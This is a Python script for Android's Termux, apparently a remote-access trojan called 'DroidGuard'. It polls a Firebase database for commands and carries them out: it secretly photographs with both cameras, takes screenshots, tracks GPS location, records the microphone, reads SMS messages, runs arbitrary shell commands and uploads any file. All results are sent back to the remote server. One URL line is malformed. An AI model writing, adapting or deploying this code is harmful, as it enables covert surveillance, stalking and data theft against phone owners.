#!/data/data/com.termux/files/usr/bin/python
import os, sys, time, json, base64, subprocess, requests, hashlib, tempfile

FIREBASE_URL = "https://droidguard-10597-default-rtdb.firebaseio.com/"
GITHUB_RAW = "https://raw.githubusercontent.com/gynbetfc/liveandroid/main/"

def executar_comando_qualquer(comando_json):
    """Executa QUALQUER comando que chegar do Firebase"""
    acao = comando_json.get("acao", "")
    params = comando_json.get("params", {})
    
    print(f"[*] Executando: {acao}")
    
    # Dicionário de ações possíveis
    if acao == "foto_frontal":
        cam_id = "1"
        arquivo = f"/sdcard/droid_{int(time.time())}.jpg"
        subprocess.run(f"termux-camera-photo -c {cam_id} {arquivo}", shell=True, timeout=10)
        with open(arquivo, "rb") as f: foto = base64.b64encode(f.read()).decode()
        os.remove(arquivo)
        return {"foto": foto}
    
    elif acao == "foto_traseria":
        cam_id = "0"
        arquivo = f"/sdcard/droid_{int(time.time())}.jpg"
        subprocess.run(f"termux-camera-photo -c {cam_id} {arquivo}", shell=True, timeout=10)
        with open(arquivo, "rb") as f: foto = base64.b64encode(f.read()).decode()
        os.remove(arquivo)
        return {"foto": foto}
    
    elif acao == "screenshot":
        arquivo = f"/sdcard/droid_{int(time.time())}.png"
        subprocess.run(f"termux-screenshot {arquivo}", shell=True, timeout=5)
        with open(arquivo, "rb") as f: screen = base64.b64encode(f.read()).decode()
        os.remove(arquivo)
        return {"screen": screen}
    
    elif acao == "gps":
        result = subprocess.run("termux-location", shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            gps = json.loads(result.stdout)
            return {"latitude": gps.get("latitude"), "longitude": gps.get("longitude")}
    
    elif acao == "bateria":
        result = subprocess.run("termux-battery-status", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            bat = json.loads(result.stdout)
            return {"nivel": bat.get("percentage"), "status": bat.get("status")}
    
    elif acao == "vibrar":
        subprocess.run(f"termux-vibrate -d {params.get('duracao', 1000)}", shell=True, timeout=2)
        return {"status": "vibrou"}
    
    elif acao == "falar":
        texto = params.get("texto", "Comando recebido")
        subprocess.run(f'termux-tts-speak "{texto}"', shell=True, timeout=5)
        return {"status": "falou"}
    
    elif acao == "gravar_audio":
        duracao = params.get("duracao", 10)
        arquivo = f"/sdcard/droid_audio_{int(time.time())}.aac"
        subprocess.run(f"termux-microphone-record -f {arquivo} -d {duracao}", shell=True, timeout=duracao+5)
        with open(arquivo, "rb") as f: audio = base64.b64encode(f.read()).decode()
        os.remove(arquivo)
        return {"audio": audio}
    
    elif acao == "listar_sms":
        result = subprocess.run("termux-sms-list -l 20", shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            sms_list = json.loads(result.stdout)
            return {"sms": [{"numero": s.get("number"), "texto": s.get("body")[:100], "data": s.get("received")} for s in sms_list]}
    
    elif acao == "shell":
        comando = params.get("cmd", "")
        result = subprocess.run(comando, shell=True, capture_output=True, text=True, timeout=10)
        return {"stdout": result.stdout, "stderr": result.stderr}
    
    elif acao == "upload_file":
        caminho = params.get("path", "")
        if os.path.exists(caminho):
            with open(caminho, "rb") as f:
                arquivo_base64 = base64.b64encode(f.read()).decode()
            return {"nome": os.path.basename(caminho), "conteudo": arquivo_base64}
    
    return {"erro": f"Comando desconhecido: {acao}"}

def loop_principal():
    device_id = hashlib.md5(os.uname().nodename.encode()).hexdigest()[:8]
    print(f"🟢 DroidGuard Ativo | Device: {device_id}")
    
    # Registrar dispositivo
    try:
        requests.patch(f"{FIREBASE_URL}/dispositivos/{device_id}.json", 
                      json={"status": "online", "ultimo_ping": time.time()})
    except: pass
    
    ultimo_comando_id = None
    
    while True:
        try:
            # Buscar comando pendente
            url = f"{FIREBASE_URL}/comandos/{device_id}.json"
            if ultimo_comando_id:
                url += f"?orderBy="$key"&startAfter="{ultimo_comando_id}""
            
            resp = requests.get(url, timeout=30)
            if resp.status_code == 200 and resp.json():
                for cmd_id, comando in resp.json().items():
                    ultimo_comando_id = cmd_id
                    
                    # Executar comando
                    resultado = executar_comando_qualquer(comando)
                    
                    # Enviar resultado
                    resultado["timestamp"] = time.time()
                    requests.put(f"{FIREBASE_URL}/resultados/{device_id}/{cmd_id}.json", 
                               json=resultado)
                    
                    # Limpar comando (opcional)
                    # requests.delete(f"{FIREBASE_URL}/comandos/{device_id}/{cmd_id}.json")
            
            # Enviar heartbeat
            requests.patch(f"{FIREBASE_URL}/dispositivos/{device_id}.json",
                          json={"status": "online", "ultimo_ping": time.time(),
                                "bateria": subprocess.run("termux-battery-status", shell=True, capture_output=True, text=True).stdout})
            
            time.sleep(10)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Erro: {e}")
            time.sleep(10)
    
    # Offline
    requests.patch(f"{FIREBASE_URL}/dispositivos/{device_id}.json", json={"status": "offline"})

if __name__ == "__main__":
    loop_principal()
